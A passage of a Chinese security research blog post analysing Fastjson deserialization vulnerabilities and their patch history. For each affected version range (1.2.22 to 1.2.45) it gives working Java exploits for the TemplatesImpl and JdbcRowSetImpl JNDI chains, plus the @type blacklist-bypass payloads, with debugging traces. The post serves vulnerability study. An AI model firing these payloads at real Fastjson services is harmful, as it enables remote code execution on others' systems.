Test0</span><br></pre></td></tr></table></figure><p>下面的图，给出了不同的field是如何设置属性值的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698418921724-c390b176-b81c-4402-9b3c-574351c6042d.png" alt="image.png"></p><h2 id="parse和parseObject的区别"><a href="#parse和parseObject的区别" class="headerlink" title="parse和parseObject的区别"></a>parse和parseObject的区别</h2><p>单参parseObject是parse的封装，在封装的末尾，多了一个JSON.toJSON()，转JSONObject类型的操作。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698405744528-716355e9-7545-4a51-889b-f5750dcab5fa.png" alt="image.png"><br>这个操作会调用obj对象的所有getter方法。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698405588482-9209f38e-9327-474e-815d-746f019f82f3.png" alt="image.png"><br>而双参parseObecjt则不会调用JSON.toJSON()，从调用getter&#x2F;setter的角度相当于parse函数。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698408678972-84dfc6c8-4cbe-450f-805c-9a3c8c8808e7.png" alt="image.png"><br><strong>总结：单参parseObject先调用一遍parse能调用的setter和getter，然后再调用一遍object所有的getter；</strong><br><strong>双参parseObject在调getter&#x2F;setter方面相当于parse。</strong></p><h1 id="1-2-22-1-2-24"><a href="#1-2-22-1-2-24" class="headerlink" title="1.2.22-1.2.24"></a>1.2.22-1.2.24</h1><h2 id="TemplatsImpl链"><a href="#TemplatsImpl链" class="headerlink" title="TemplatsImpl链"></a>TemplatsImpl链</h2><p>本质上，就是利用fastjson的任意getter调用去调getOutputProperties，触发CC3后半的链条。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="comment">// fastjson 1.2.22-1.2.24</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> ClassFile2Base64(<span class="string">&quot;D:\\Calc.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> String.format(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;%s\&quot;,\&quot;_bytecodes\&quot;: [\&quot;%s\&quot;],&#x27;_name&#x27;:&#x27;jasper&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,&#x27;_outputProperties&#x27;:&#123;&#125;&#125;&quot;</span>, className,codes);</span><br><span class="line">        JSON.parse(exp, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ClassFile2Base64</span><span class="params">(String filePath)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>要开Feature，挺鸡肋的</li></ul><h3 id="为什么加-type指定全类名"><a href="#为什么加-type指定全类名" class="headerlink" title="为什么加@type指定全类名"></a>为什么加@type指定全类名</h3><p>不加的话，parse函数不会触发getter和setter</p><h3 id="为什么parse要加Feature参数"><a href="#为什么parse要加Feature参数" class="headerlink" title="为什么parse要加Feature参数"></a>为什么parse要加Feature参数</h3><p>Feature.SupportNonPublicField，字面意思要允许给非public字段赋值，CC3这些字段都public的。<br>由此可见这条链其实很鸡肋。</p><h3 id="为什么-bytecodes要base64编码"><a href="#为什么-bytecodes要base64编码" class="headerlink" title="为什么_bytecodes要base64编码"></a>为什么_bytecodes要base64编码</h3><p>Fastjson解析到byte[]数组的时候，会对byte[]数组进行base64decode。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bytesValue:112, JSONScanner</span><br><span class="line">deserialze:136, ObjectArrayCodec</span><br><span class="line">parseArray:723, DefaultJSONParser</span><br><span class="line">deserialze:177, ObjectArrayCodec</span><br><span class="line">parseField:71, DefaultFieldDeserializer</span><br><span class="line">parseField:773, JavaBeanDeserializer</span><br><span class="line">deserialze:600, JavaBeanDeserializer</span><br><span class="line">deserialze:188, JavaBeanDeserializer</span><br><span class="line">deserialze:184, JavaBeanDeserializer</span><br><span class="line">parseObject:368, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:193, JSON</span><br><span class="line">main:13, Test1TemplatesImpl</span><br></pre></td></tr></table></figure><h3 id="为什么会触发getOutputProperties"><a href="#为什么会触发getOutputProperties" class="headerlink" title="为什么会触发getOutputProperties"></a>为什么会触发getOutputProperties</h3><p>前面我们知道parse函数触发getter比setter苛刻，但是getOutputProperties正好满足要求。</p><ul><li>TemplatesImpl里只有对应的getter没有setter，setter不会抢getter位置</li><li>函数名符合规范</li><li>非static</li><li>返回值是Properties，是Map接口的实现类</li><li>无参</li></ul><h2 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h2><p>本质是触发JNDI注入。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot; ,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ul><li>因为用的JNDI注入，受JDK版本限制</li><li>要能出网，不然无法加载远程类</li></ul><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>JdbcRowSetImpl#connect有一个标准的JNDI注入<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698422368971-6be86174-3e37-4d35-a58d-e2e5060b0ae0.png" alt="image.png"><br>存在对应setter可以控制注入点<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698423729449-9b5047c8-bcc1-4bc7-90f7-eb385875c1df.png" alt="image.png"><br>find usage看哪调了connect，在JdbcRowSetImpl#setAutoCommit调用了，以这个做为sink点即可。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698423846048-563056cc-bb62-4197-8462-710029dc5506.png" alt="image.png"></p><h3 id="为什么是DataSourceName而不是dataSource"><a href="#为什么是DataSourceName而不是dataSource" class="headerlink" title="为什么是DataSourceName而不是dataSource"></a>为什么是DataSourceName而不是dataSource</h3><p>注意到exp里写的并不是属性名dataSource，而是对应setter去掉set后的字符串DataSourceName。<br>这涉及到fastjson反序列化的属性赋值流程：</p><ol><li>通过setter&#x2F;getter截断前三字符，确定为propertyName</li><li>扫描JSON String，通过propertyName匹配到propertyValue（这是我们控制属性值的地方）</li><li>调用对应setter，setter(propertyValue)</li></ol><p>显然，在第二步扫描JSON String的时候，用的propertyName是函数截断后的字符，而不一定是真的属性名。<br>以上面为例，第二步是按照dataSourceName去JSON String里找对应值，而不是按dataSource去找。</p><h1 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h1><p>引入autoTypeSupport，默认为False，开启黑白名单校验与Bypass之路。</p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>修改fastjson版本到1.2.25，再次运行上面的exp，程序抛出异常。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717429189-80eeaf7e-d424-4e20-b2f1-af9118a4f559.png"><br>注意到异常抛出点：com.alibaba.fastjson.parser.ParserConfig.checkAutoType，下断点调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checkAutoType:805, ParserConfig</span><br><span class="line">parseObject:322, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:6, Test1JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>默认情况下，会进入这个IF，对类名先黑名单校验，再白名单校验。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717639728-09e39775-2594-459c-8063-e9e721548432.png"><br>黑名单里有前两条链子指定的类，所以直接抛异常。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717888684-0a64b119-f142-4a87-b20c-faa93e50245f.png"><br>开启autoTypeSupport的方法</p><ul><li>JVM启动参数：-Dfastjson.parser.autoTypeSupport&#x3D;true</li><li>代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</li></ul><p>acceptList添加方法</p><ul><li>JVM启动参数：-Dfastjson.parser.autoTypeAccept&#x3D;com.xx.a.,com.yy.</li><li>代码中设置：ParserConfig.getGlobalInstance().addAccept(“com.xx.a”);</li><li>配置文件配置：在1.2.25&#x2F;26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：fastjson.parser.autoTypeAccept&#x3D;com.taobao.pac.client.sdk.dataobject.,com.cainiao.</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>把@type对应的值改成：”L类名;”，如下面的exp所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.41</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>需要开启autoTypeSupport，有点鸡肋。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>按照exp的绕过方法，肯定是能过denyList的，问题是为什么那样写类名也能加载到，需要分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">loadClass:1074, TypeUtils</span><br><span class="line">checkAutoType:861, ParserConfig</span><br><span class="line">parseObject:322, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:8, Test2</span><br></pre></td></tr></table></figure><p>从下面可以看到，如果类名以”L”开头、以”;”结尾，就会trim掉首尾的字符，然后<strong>递归调用loadClass。</strong><br>所以这种绕过方法是能加载到类的，也就能正常执行exp了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698738981491-d537178e-29e0-44cf-92a7-b3eceaefe83a.png" alt="image.png"></p><h1 id="1-2-25-1-2-42"><a href="#1-2-25-1-2-42" class="headerlink" title="1.2.25-1.2.42"></a>1.2.25-1.2.42</h1><h2 id="补丁分析-1"><a href="#补丁分析-1" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>fastjson版本换到1.2.42，再次运行上面的exp，发现抛出异常了，检测到了上面那种类名写法。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698741593872-0a380d67-9006-453d-9996-57d06b6c5425.png" alt="image.png"><br>被检测的到的原因，是开发人员在checkAutoType里，检测到前”L”后”;”的类名，就提前trim一次。<br>另外，为了提高挖洞门槛，把denyList改成hash值了，不过github已经有<a href="https://github.com/LeadroyaL/fastjson-blacklist">项目</a>跑出来了大部分黑名单类名。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742254326-a6235a77-e215-4f46-9daf-68504a33f1f8.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742295676-8f87c893-ebda-4c6f-adcf-46825313086d.png" alt="image.png"></p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><p>把@type对应的值改成：”LL类名;;”，即经典双写绕过，如下面的exp所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.42</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2><p>需要开启autoTypeSupport，有点鸡肋。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h2 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h2><p>这里问题在于它提前trim了一下我们的类名，但是实际上在后面的TypeUtils#loadClass里也会trim我们的类名，而且是递归trim，很容易想到双写绕过黑名单。<br>首先，在ParserConfig#checkAutoType里trim一下我们的类名，由于这里双写 ，可以过黑名单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checkAutoType:906, ParserConfig</span><br><span class="line">parseObject:311, DefaultJSONParser</span><br><span class="line">parse:1338, DefaultJSONParser</span><br><span class="line">parse:1304, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:9, Test3</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742671061-892d31eb-edcf-466c-97f4-9a1054ca50cb.png" alt="image.png"><br>然后，我们进到TypeUtils#loadClass里，这里会递归trim我们的类名，最后加载到我们的类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">loadClass:1131, TypeUtils [3]</span><br><span class="line">loadClass:1127, TypeUtils</span><br><span class="line">loadClass:1144, TypeUtils [2]</span><br><span class="line">loadClass:1127, TypeUtils</span><br><span class="line">loadClass:1144, TypeUtils [1]</span><br><span class="line">checkAutoType:975, ParserConfig</span><br><span class="line">parseObject:311, DefaultJSONParser</span><br><span class="line">parse:1338, DefaultJSONParser</span><br><span class="line">parse:1304, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:9, Test3</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742892048-e05e79dc-4787-48fe-a561-02a766cbe790.png" alt="image.png"></p><h1 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h1><h2 id="补丁分析-2"><a href="#补丁分析-2" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>运行上个exp，报错，双写也被识别到了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698743073506-9a513a40-2c3b-40ac-bc61-1d8f45996c5f.png" alt="image.png"><br>ParserConfig#checkAutoType下断点调试，看看怎么个事。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698743639941-33ddd478-84c1-4147-8283-d6697f1802a5.png" alt="image.png"><br>发现多加了一层IF，判断类名前两个字符是不是”L”，是的话直接抛异常，这样双写肯定就失效了。</p><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p>之前加”L;”的方法无法使用，但是还有加”[“的方法，这是看TypeUtils#loadClass里处理类名的逻辑，自然想到的绕过方法，具体payload为什么是这样，看<strong>调试分析</strong>部分。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.43</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2><p>需要开启autoTypeSupport，有点鸡肋。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h2 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h2><p>首先，我们看TypeUtils#loadClass，这里显示如果第一个字符是”[“，就trim掉，然后再执行loadClass，这是我们所希望的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750115778-9544d540-76ae-481b-8de6-12b1f83eace5.png" alt="image.png"><br>于是我们构造payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>调试分析，发现会抛出异常</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">parseArray:675, DefaultJSONParser</span><br><span class="line">deserialze:183, ObjectArrayCodec</span><br><span class="line">parseObject:373, DefaultJSONParser</span><br><span class="line">parse:1338, DefaultJSONParser</span><br><span class="line">parse:1304, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:10, Test4</span><br></pre></td></tr></table></figure><p>提示代码期待在指定位置”,”前面，加上”[“符号。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750540577-417e8113-7cae-400b-87bf-157dc1928e47.png" alt="image.png"><br>于是我们改进payload如下，加上”[“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>再次抛出异常，提示我们在指定位置加上”{“符合。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750783181-80234dfa-4312-4646-8af5-08d8dfac3c85.png" alt="image.png"><br>于是我们再改进Payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>成功执行命令。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750971771-b5591e83-9bae-43d8-b3a5-03d6786f6a92.png" alt="image.png"></p><h1 id="1-2-25-1-2-45"><a href="#1-2-25-1-2-45" class="headerlink" title="1.2.25-1.2.45"></a>1.2.25-1.2.45</h1><h2 id="补丁分析-3"><a href="#补丁分析-3" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>运行上面的exp，会抛出异常，”[“的绕过方式也被检测到了<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698751620126-5769e711-7bd5-4fb3-af05-f324f2792e50.png" alt="image.png"><br>开发者在ParserConfig#checkAutoType又加了校验，如果类名开头是”[“直接抛出异常<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698751825640-0d6820b6-fbbe-485c-9895-3b0268173a82.png" alt="image.png"></p><h2 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h2><p>利用mybatis的依赖里的类，去打Mybatis里的JNDI注入，因为JndiDataSourceFactory不在黑名单里。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.45</span></span><br><span class="line"><span 